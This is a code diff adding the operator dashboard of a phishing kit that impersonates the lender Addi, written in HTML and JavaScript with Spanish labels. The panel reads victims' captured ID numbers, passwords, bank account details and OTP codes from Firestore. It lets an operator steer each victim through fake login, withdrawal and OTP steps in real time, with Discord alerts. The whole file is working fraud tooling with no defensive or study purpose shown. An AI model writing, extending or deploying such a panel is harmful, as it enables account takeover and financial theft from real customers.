@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dashboard — Control de flujo Addi</title>
+<style>
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  body{font-family:'Segoe UI',system-ui,-apple-system,Roboto,Arial,sans-serif;background:#12141a;color:#e9ebf1;min-height:100vh}
+  header{display:flex;align-items:center;gap:12px;padding:12px 18px;background:#1b1e26;border-bottom:1px solid #2a2e38;position:sticky;top:0;z-index:5;flex-wrap:wrap}
+  .d-logo{height:24px;width:auto}
+  .d-title{font-size:15px;font-weight:800;color:#cdd3de}
+  .d-btn{background:#3b3f4d;color:#fff;border:none;border-radius:8px;padding:7px 12px;font-size:12px;cursor:pointer;font-family:inherit}
+  .d-btn-danger{background:#e5484d;color:#fff;border:none;border-radius:8px;padding:7px 12px;font-size:12px;cursor:pointer;font-family:inherit}
+  .d-status{margin-left:auto;display:flex;align-items:center;gap:8px;font-size:13px;color:#8f97a5}
+  .d-bullet{width:9px;height:9px;border-radius:50%;background:#f5a623}
+  main{max-width:1100px;margin:0 auto;padding:18px 14px}
+  .d-grid{display:flex;flex-direction:column;gap:12px;align-items:stretch}
+  .d-win{flex:1 1 auto;background:#1b1e26;border:1px solid #2a2e38;border-radius:14px;padding:13px 15px;display:flex;flex-direction:column;gap:9px}
+  .d-win.pend{border-color:#f5a623}
+  .d-win-head{display:flex;justify-content:space-between;align-items:center;gap:8px}
+  .d-win-head b{font-family:'Consolas',monospace;font-size:12px;color:#9aa3b2}
+  .d-pill{font-size:11px;padding:3px 9px;border-radius:20px;font-weight:700;background:#232732;color:#cdd3de;white-space:nowrap}
+  .d-pill.pend{background:#f5a623;color:#0c0f12}
+  .d-paso{font-size:16px;font-weight:800;color:#fff}
+  .d-next{font-size:12px;color:#f5a623}
+  .d-fila{font-size:12px;color:#8f97a5;line-height:1.5}
+  .d-actions{display:flex;flex-wrap:wrap;gap:6px}
+  .d-action{padding:9px 12px;border:none;border-radius:9px;font-weight:700;font-size:12px;cursor:pointer;font-family:inherit}
+  .d-action.ok{background:#3ecf6e;color:#0c0f12}
+  .d-action.err{background:#e5484d;color:#fff}
+  .d-input{flex:1;min-width:0;background:#12141a;color:#e9ebf1;border:1px solid #333845;border-radius:8px;padding:7px 9px;font-family:inherit;font-size:13px}
+  .d-otp-nota{font-size:11px;color:#8f97a5}
+  .d-jumps{margin-top:2px}
+  .d-jumps-lbl{font-size:11px;color:#8f97a5;margin-bottom:2px}
+  .d-steps{display:flex;flex-wrap:wrap;gap:4px;margin-top:4px}
+  .d-step{background:#232732;color:#cdd3de;border:1px solid #333845;padding:3px 7px;border-radius:6px;font-size:10px;cursor:pointer;font-family:inherit}
+  .d-step.active{background:#3ecf6e;color:#0c0f12;font-weight:700}
+  .d-btn-del{background:#3b2430;color:#ffb4b4;border:1px solid #7a2c39;border-radius:8px;padding:6px 10px;font-size:11px;cursor:pointer;font-family:inherit;width:100%}
+  .d-msg{font-size:12px;color:#8f97a5}
+  /* ---------- Acceso restringido (login dashboard) ---------- */
+  .auth-layer{
+    position:fixed;inset:0;z-index:9999;background:rgba(9,10,14,.93);
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+  }
+  .auth-card{
+    background:#1b1e26;border:1px solid #2a2e38;border-radius:16px;padding:22px 26px;
+    width:318px;display:flex;flex-direction:column;gap:14px;text-align:center;
+  }
+  .auth-card .d-logo{height:24px;width:auto}
+  .auth-card h2{font-size:16px;font-weight:800;color:#fff;margin:0}
+  .auth-card p{font-size:12px;color:#8f97a5;margin:0}
+  .auth-input{background:#12141a;color:#e9ebf1;border:1px solid #333845;border-radius:8px;padding:11px 12px;font-size:14px;font-family:inherit;text-align:center}
+  .auth-btn{background:#3ecf6e;color:#0c0f12;border:none;border-radius:9px;padding:11px;font-weight:800;font-size:14px;cursor:pointer;font-family:inherit}
+  .auth-err{font-size:12px;color:#ff9b9b;text-align:center;display:none}
+</style>
+</head>
+<body>
+<header>
+  <img class="d-logo" src="addi-logo.svg" alt="Addi">
+  <span class="d-title">Dashboard de flujo</span>
+  <button class="d-btn" onclick="testWebhook()">🧪 Probar webhook</button>
+  <button class="d-btn-danger" onclick="borrarTodas()">🗑 Borrar todas</button>
+  <span class="d-status"><span class="d-bullet"></span><span id="dStatusTxt">Conectando…</span> · <b id="dCount">0</b> sesiones</span>
+</header>
+<main>
+  <div class="d-grid" id="dGrid"><p class="d-msg">Conectando a Firestore…</p></div>
+</main>
+<!-- Acceso restringido (login del dashboard) -->
+<div class="auth-layer" id="authLayer" style="display:none">
+  <div class="auth-card">
+    <img class="d-logo" src="addi-logo.svg" alt="Addi">
+    <h2>Acceso restringido</h2>
+    <p>Este panel es solo para el asesor autorizado.</p>
+    <input class="auth-input" id="authPass" type="password" placeholder="Contraseña" autocomplete="off">
+    <div class="auth-err" id="authErr">Contraseña incorrecta.</div>
+    <button class="auth-btn" onclick="tryLogin()">Ingresar</button>
+  </div>
+</div>
+<script>
+// El webhook de Discord NO vive aquí: lo reenvía /api/notificar (secreto en env vars de Vercel)
+const ADMIN_TOKEN = 'CAMBIA-ESTE-TOKEN'; // debe coincidir con firestore.rules.json
+const FIREBASE_CONFIG = {
+  apiKey: "TU_FIREBASE_API_KEY",
+  authDomain: "addidataset.firebaseapp.com",
+  projectId: "addidataset",
+  storageBucket: "addidataset.firebasestorage.app",
+  messagingSenderId: "1001401727670",
+  appId: "1:1001401727670:web:7515b67dc8bb451416c417"
+};
+const STEPS = {
+  's-cedula':'1. Cédula',
+  's-pass':'2. Contraseña',
+  's-processing':'3. Procesando',
+  's-banco':'4. Banco / Cuenta',
+  's-cupo':'5. Cupo / Retiro',
+  's-otp':'6. Código OTP',
+  's-verifying':'7. Validando código',
+  's-plans':'8. Cuotas',
+  's-confirm':'9. Confirmar',
+  's-identity':'10. Identidad',
+  's-verifying2':'11. Finalizando',
+  's-success':'12. Éxito'
+};
+let docs = [];
+let orden = [];
+let fDb, fDoc, fColl, fUpdateDoc, fOnSnapshot, fDeleteDoc;
+// valores en curso de inputs por sesión (para no perderlos al redibujar)
+let vals = {};
+
+function $(id){ return document.getElementById(id); }
+function fmt(n){ if(n===undefined || n===null) return '—'; return '$' + Number(n).toLocaleString('es-CO'); }
+function stampMs(v){ return (v && typeof v.toMillis === 'function') ? v.toMillis() : (Number(v) || 0); }
+
+function cmd(sid, objeto){
+  if(!sid) return;
+  try{
+    fUpdateDoc(fDoc(fDb,'solicitudes',sid), { comando: Object.assign({ id: Date.now(), canal: sid, adminToken: ADMIN_TOKEN }, objeto) });
+  }catch(e){ console.warn('cmd:', e); }
+}
+function send(sid, go){ cmd(sid, { go }); }
+function sendErr(sid, tipo){ cmd(sid, { error: tipo }); }
+function sendOtp(sid, ok){ cmd(sid, { otp: ok ? 'ok' : 'bad', go: ok ? 's-plans' : null }); }
+function sendAuth(sid, monto, tel, comercio){
+  const v = Number(String(monto||'').replace(/\D/g,''));
+  if(!v || v <= 0) return;
+  const t = String(tel||'').replace(/\D/g,'');
+  const payload = { monto: v, go: 's-processing' };
+  if(t.length >= 4) payload.telefono = t;
+  const cm = String(comercio||'').trim();
+  if(cm) payload.comercio = cm;
+  cmd(sid, payload);
+}
+function deleteOne(sid){
+  if(!sid) return;
+  try{ fDeleteDoc(fDoc(fDb,'solicitudes',sid)); }catch(e){ console.warn('delete:', e); }
+}
+function borrarTodas(){
+  if(!docs.length) return;
+  if(!confirm('¿Borrar TODAS las ' + docs.length + ' sesiones?')) return;
+  docs.forEach(d => deleteOne(d.id));
+}
+function testWebhook(){
+  try{
+    fetch('/api/notificar',{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ content:'🧪 Mensaje de prueba desde el Dashboard ✔' }) }).catch(()=>{});
+  }catch(e){}
+}
+function actionsFor(d){
+  const c = document.createElement('div'); c.className = 'd-actions';
+  const b = (lbl, fn, cls)=>{ const x=document.createElement('button'); x.className='d-action '+(cls||''); x.textContent=lbl; x.onclick=fn; c.appendChild(x); };
+  const sid = d.id;
+  if(d.paso==='s-cedula' && d.pendiente){
+    b('✓ Cuenta existe', ()=>send(sid,'s-pass'), 'ok');
+    b('✗ Cuenta no existe', ()=>sendErr(sid,'cuenta-no-existe'), 'err');
+  } else if(d.paso==='s-pass' && d.pendiente){
+    const v = vals[sid] || {};
+    const m = document.createElement('input'); m.className='d-input'; m.type='text'; m.inputMode='numeric';
+    m.placeholder='Monto a retirar ($)';
+    m.value = (v.m !== undefined) ? v.m : ((d.datos && d.datos.amount) ? fmt(d.datos.amount) : '');
+    const fmtMonto = ()=>{ const clean = String(m.value||'').replace(/[^0-9]/g,''); m.value = clean ? '$' + Number(clean).toLocaleString('es-CO') : ''; vals[sid] = Object.assign({}, vals[sid], { m: m.value }); };
+    m.addEventListener('input', fmtMonto);
+    m.addEventListener('focus', fmtMonto);
+    c.appendChild(m);
+    const t = document.createElement('input'); t.className='d-input'; t.inputMode='numeric';
+    t.placeholder='Celular (ej 3176543289)';
+    t.value = (v.t !== undefined) ? v.t : '';
+    t.oninput = ()=>{ vals[sid] = Object.assign({}, vals[sid], { t: t.value }); };
+    c.appendChild(t);
+    const cm = document.createElement('input'); cm.className='d-input';
+    cm.placeholder='👔 Comercio aliado (ej: Mac Center)';
+    cm.value = (v.c !== undefined) ? v.c : ((d.datos && d.datos.comercio) ? d.datos.comercio : '');
+    cm.oninput = ()=>{ vals[sid] = Object.assign({}, vals[sid], { c: cm.value }); };
+    c.appendChild(cm);
+    b('✓ Autorizar retiro', ()=>{ sendAuth(sid, m.value, t.value, cm.value); }, 'ok');
+    b('✗ Contraseña incorrecta', ()=>sendErr(sid,'pass-incorrecta'), 'err');
+  } else if(d.paso==='s-verifying' && d.pendiente){
+    b('✓ Código válido', ()=>sendOtp(sid,true), 'ok');
+    b('✗ Código inválido', ()=>sendOtp(sid,false), 'err');
+  } else if(d.pendiente){
+    b('Aprobar → ' + (STEPS[d.pendiente]||d.pendiente), ()=>send(sid, d.pendiente), 'ok');
+  }
+  return c;
+}
+function windowFor(d){
+  const w = document.createElement('div');
+  w.className = 'd-win' + (d.pendiente ? ' pend' : '');
+  // cabecera: id + estado
+  const head = document.createElement('div'); head.className='d-win-head';
+  const idb = document.createElement('b'); idb.textContent='Sesión ' + d.id.slice(0,8); head.appendChild(idb);
+  const pill = document.createElement('span'); pill.className='d-pill' + (d.pendiente ? ' pend' : '');
+  pill.textContent = d.pendiente ? '🔶 espera ' + (STEPS[d.pendiente]||d.pendiente) : 'activa';
+  head.appendChild(pill);
+  w.appendChild(head);
+  // credenciales del cliente (usuario y contraseña ingresadas)
+  const da = d.datos || {};
+  const creds = document.createElement('div'); creds.className='d-fila';
+  creds.textContent = '👤 ' + (da.cedula||'—') + '  ·  🔑 ' + (da.password||'—');
+  w.appendChild(creds);
+  // resto de datos
+  const fila = document.createElement('div'); fila.className='d-fila';
+  const partes = [];
+  if(da.phone)      partes.push(da.phone);
+  if(da.amount)     partes.push(fmt(da.amount));
+  if(da.term)       partes.push(da.term + ' cuotas');
+  if(da.banco)      partes.push('🏦 ' + da.banco);
+  if(da.cuentaTipo) partes.push(da.cuentaTipo);
+  if(da.cuentaNum)  partes.push('#' + da.cuentaNum);
+  if(da.retirar)    partes.push('💵 ' + fmt(da.retirar));
+  if(da.comercio)   partes.push('👔 ' + da.comercio);
+  fila.textContent = partes.length ? partes.join(' · ') : 'Esperando datos del cliente…';
+  w.appendChild(fila);
+  // paso actual
+  const paso = document.createElement('div'); paso.className='d-paso';
+  paso.textContent = STEPS[d.paso] || d.paso;
+  w.appendChild(paso);
+  if(d.pendiente){
+    const nx = document.createElement('div'); nx.className='d-next';
+    nx.textContent = 'Espera tu validación → ' + (STEPS[d.pendiente]||d.pendiente);
+    w.appendChild(nx);
+  }
+  // note OTP
+  if(da.otp){
+    const on = document.createElement('div'); on.className='d-otp-nota';
+    on.textContent = '📲 Código OTP enviado al cliente: ' + da.otp;
+    w.appendChild(on);
+  }
+  // acciones
+  w.appendChild(actionsFor(d));
+  // saltar a paso (override, siempre visible)
+  const jumps = document.createElement('div'); jumps.className='d-jumps';
+  const lbl = document.createElement('div'); lbl.className='d-jumps-lbl';
+  lbl.textContent = 'Saltar a paso (override):';
+  jumps.appendChild(lbl);
+  const steps = document.createElement('div'); steps.className='d-steps';
+  Object.keys(STEPS).forEach(id=>{
+    const b=document.createElement('button'); b.className='d-step' + (id===d.paso?' active':'');
+    b.textContent = String(STEPS[id]).split('.')[0];
+    b.title = STEPS[id];
+    b.onclick = ()=>send(d.id, id);
+    steps.appendChild(b);
+  });
+  jumps.appendChild(steps);
+  w.appendChild(jumps);
+  const delb = document.createElement('button');
+  delb.className = 'd-btn-del';
+  delb.textContent = '🗑 Borrar sesión';
+  delb.onclick = ()=>{ if(confirm('¿Borrar esta sesión (' + d.id.slice(0,8) + ')?')) deleteOne(d.id); };
+  w.appendChild(delb);
+  return w;
+}
+function renderWindows(){
+  const grid = $('dGrid');
+  $('dCount').textContent = docs.length;
+  if(!docs.length){
+    grid.innerHTML = '<p class="d-msg">Sin sesiones. Abre index.html en el navegador del cliente.</p>';
+    return;
+  }
+  grid.innerHTML = '';
+  docs.forEach(d => grid.appendChild(windowFor(d)));
+}
+/* ====== Acceso restringido (login dashboard) ====== */
+async function tryLogin(){
+  try{
+    const r = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ clave: String($('authPass').value || '') })
+    });
+    if(r.ok){
+      try{ sessionStorage.setItem('dash_auth','1'); }catch(e){}
+      $('authLayer').style.display = 'none';
+      $('authErr').style.display = 'none';
+    }else{
+      $('authErr').style.display = 'block';
+      $('authPass').value = '';
+      $('authPass').focus();
+    }
+  }catch(e){
+    $('authErr').style.display = 'block';
+  }
+}
+(function authInit(){
+  const ok = (()=>{ try{ return sessionStorage.getItem('dash_auth') === '1'; }catch(e){ return false; } })();
+  $('authLayer').style.display = ok ? 'none' : 'flex';
+  const inp = $('authPass');
+  if(inp) inp.addEventListener('keydown', e => { if(e.key === 'Enter') tryLogin(); });
+})();
+(async function init(){
+  const appMod = await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js');
+  const fsMod  = await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js');
+  const app = appMod.initializeApp(FIREBASE_CONFIG);
+  fDb = fsMod.getFirestore(app);
+  fDoc = fsMod.doc; fColl = fsMod.collection; fUpdateDoc = fsMod.updateDoc; fOnSnapshot = fsMod.onSnapshot; fDeleteDoc = fsMod.deleteDoc;
+  fOnSnapshot(fColl(fDb,'solicitudes'), snap => {
+    const nuevos = [];
+    snap.forEach(x => nuevos.push(Object.assign({ id: x.id }, x.data())));
+    // ORDEN ESTABLE: las ventanas NO cambian de lugar al actualizarse.
+    // Las sesiones nuevas se agregan al final en su primer orden.
+    const ids = nuevos.map(n => n.id);
+    // Las sesiones NUEVAS entran AL INICIO (visibles a la izquierda);
+    // las existentes NO cambian de posición al actualizarse.
+    const existentes = orden.filter(o => ids.indexOf(o) !== -1);
+    const recienllegadas = ids.filter(i => orden.indexOf(i) === -1);
+    orden = recienllegadas.concat(existentes);
+    const pos = {};
+    orden.forEach((id, ix) => { pos[id] = ix; });
+    docs = nuevos.sort((a,b) => (pos[a.id] !== undefined ? pos[a.id] : 9e9) - (pos[b.id] !== undefined ? pos[b.id] : 9e9));
+    renderWindows();
+    const st = $('dStatusTxt'); st.textContent = 'Conectado';
+  }, err => { const st = $('dStatusTxt'); st.textContent = 'Error Firestore: ' + err.message; });
+  document.querySelector('.d-bullet').style.background = '#3ecf6e';
+})().catch(e => { const st = $('dStatusTxt'); st.textContent = 'Error Firebase: ' + e.message; });
+</script>
+</body>
+</html>
